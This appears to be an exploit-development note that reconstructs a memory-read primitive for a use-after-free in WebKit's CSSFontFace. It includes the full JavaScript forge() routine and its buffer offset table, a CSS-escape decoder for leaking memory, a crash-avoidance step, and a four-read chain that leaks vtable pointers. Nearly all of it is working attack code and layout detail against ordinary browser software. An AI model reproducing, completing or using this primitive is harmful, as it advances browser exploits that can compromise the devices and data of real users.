# forgeRead Mechanism — Reconstruction from p690/p691/p672 Evidence

## Status
- **p691 source HTML is LOST** — served from memory by a previous session's serve.py, never committed
- **p692 forgeRead is BROKEN** — writes only +0x58, missing 6 other critical offsets
- **This document reconstructs the working mechanism from device evidence**

## The forgeRead Buffer Layout

The CSSFontFace object is 192 bytes. After the UAF + ArrayBuffer spray reclaim,
the attacker controls all 192 bytes via `DataView`. The `face.style` getter
traverses the CSSFontFace struct through its property storage to serialize a CSS
value. By forging specific fields, we redirect this serialization to read from
an arbitrary address.

### Offsets Written by forgeRead (from p672 line 285-297)

```
Offset   Value                  Purpose
------   -----                  -------
+0x08    self + 0x70            Overwrites CSSFontFace member (m_mutableProperties?)
+0x10    0                      Clear adjacent field
+0x30    4                      Property count / type tag
+0x34    readLen                Length of data to read
+0x38    targetAddr             Target address to read FROM
+0x40    4                      Secondary type tag
+0x44    0x7A ('z')             Font family char (keeps face identifiable)
+0x45    0x7A ('z')
+0x46    0x71 ('q')
+0x70    4                      Start of forged property serialization chain
+0x74    varies (mode-dep)      Chain link: offset or type
+0x78    varies                 Chain link: pointer or value
+0x80    varies                 Chain link: count
+0x84    varies                 Chain link: padding
+0x90    3                      Secondary chain entry type
+0x94    72                     Secondary chain entry length
+0x98    self + 0x30            Secondary chain: points back to +0x30 block
```

### p672 forge() Source (lines 285-297)

```javascript
function forge(mut, daddr, dlen){
  for(var ib2=0; ib2<window.__sp.length; ib2++){
    var vb = window.__sp[ib2];
    if(!vb) continue;
    if(SKIPJ>=0 && ib2===SKIPJ) continue;
    if(DP && vb===self) continue;

    if(!CAL){
      put64(vb, 0x08, self+0x70n);
      vb[0x10] = 0;
    }
    put32(vb, 0x30, 4);
    put32(vb, 0x34, dlen);
    put64(vb, 0x38, daddr);
    put32(vb, 0x40, 4);
    vb[0x44] = 0x7A;  // 'z'
    vb[0x45] = 0x7A;  // 'z'
    vb[0x46] = 0x71;  // 'q'
    put32(vb, 0x70, 4);

    if(mut){
      put32(vb, 0x74, 0x08);
      put64(vb, 0x78, TGT);
      put32(vb, 0x80, 1);
      put32(vb, 0x84, 0);
    } else {
      put32(vb, 0x74, 0x10);
      vb[0x78] = PID & 0xFF;
      vb[0x79] = (PID >>> 8) & 0xFF;
      put64(vb, 0x7A, FP ? 0x41414141n : self+0x90n);
    }
    put32(vb, 0x90, 3);
    put32(vb, 0x94, 72);
    put64(vb, 0x98, self+0x30n);
  }
}
```

### CSS Escape Decoder (p672 lines 302-308)

`face.style` returns a CSS string where non-printable bytes are encoded as
CSS hex escapes: `\XX ` (backslash + 1-6 hex digits + optional space).

```javascript
function dec(rawCSS, maxBytes){
  var bytes = [];
  var q = (rawCSS.charAt(0)==='"') ? 1 : 0;
  var end = (rawCSS.slice(-1)==='"') ? rawCSS.length-1 : rawCSS.length;
  var k = q;

  while(k < end && bytes.length < maxBytes){
    var ch = rawCSS.charAt(k);
    if(ch === '\\'){
      k++;
      var hex = '';
      while(k < end && hex.length < 6 && /[0-9a-fA-F]/.test(rawCSS.charAt(k))){
        hex += rawCSS.charAt(k);
        k++;
      }
      if(hex.length === 0){
        if(k < end){ bytes.push(rawCSS.charCodeAt(k)); k++; }
      } else {
        if(rawCSS.charAt(k) === ' ') k++;  // consume trailing space
        var cp = parseInt(hex, 16);
        if(cp > 255) cp &= 0xFF;
        bytes.push(cp);
      }
    } else {
      bytes.push(rawCSS.charCodeAt(k));
      k++;
    }
  }

  var hexStr = '';
  for(var j=0; j<bytes.length; j++){
    hexStr += ('0'+bytes[j].toString(16)).slice(-2);
  }
  return hexStr;
}
```

### p692 vs p691 — What's Wrong

| Feature | p692 (broken) | p691 (working, lost) |
|---------|---------------|----------------------|
| Buffer writes | Only +0x58 | +0x08,+0x30,+0x34,+0x38,+0x70..+0x98 |
| CSS decode | `charCodeAt(i)` (wrong) | `dec()` with escape parsing |
| Delete before forge | Unknown | YES — `DEL-OK` beacon before `IHT-ok` |
| Walk chain | Attempts 4 reads | Successfully completes 4 reads |

### Critical Fix: Delete Before Forge

p690 crashed because the face was still in `document.fonts` when forgeRead
modified +0x08. The engine's layout thread dereferences CSSFontFace fields
during rendering. The fix (confirmed by p691 beacon timeline):

1. `document.fonts.delete(face)` — removes face from FontFaceSet
2. Wait for layout to settle
3. Then call forge() to modify the buffer
4. Then read `face.style` — the face is no longer in the set, so the
   engine won't dereference it during layout; only the explicit
   `face.style` access traverses the forged chain.

### Walk Chain Sequence (from p691 beacon log)

```
Step 1 (IHT): forge(false, L1-0x10, 80) → face.style → dec() → 160 hex chars
  Parse: dc=2, kc=1, mask=7, size=8, scan 8 buckets → find IM

Step 2 (W2): forge(false, IM+8, 16) → face.style → dec() → FO address

Step 3 (W3): forge(false, FO, 32) → face.style → dec() → VP at FO+0x00

  [optional yield: restore safe state + sync XHR]

Step 4 (W4): forge(false, VP, 72) → face.style → dec() → 9 vtable slots
```

Between each read, the buffer must be **restored** to safe values (put back
L1 at +0x58 and L2 at +0x68) before forging the next target.

### Evidence Validation

- h4len=144 hex chars = 72 bytes = 9 qwords ✓
- raw4len=175 = CSS-encoded length of 72 bytes (50 non-printable → ~150 + 22 printable + 3 overhead = ~175) ✓
- VP=0x80f4b9b28, low 12 bits 0xB28 constant across 5 boots ✓
- s2=s4=s5 (shared base impl) ✓
- s8=0 (vtable end marker) ✓

## Remaining Questions

1. **Exact semantics of +0x08 → self+0x70**: Which CSSFontFace member does this overwrite?
   Theory: m_mutableProperties (RefPtr<MutableStyleProperties>), and self+0x70
   contains a forged MutableStyleProperties header that points to +0x30 for the
   property data.

2. **The +0x70..+0x98 chain**: Two modes exist in p672 (mut=true/false). The
   walk chain uses mut=false (read mode). The exact WebKit internal struct
   these bytes fake is unconfirmed — it works empirically.

3. **VP RVA**: Not yet determined. Requires WebKit 605.1.15 source analysis or
   a decrypted WebProcess binary.
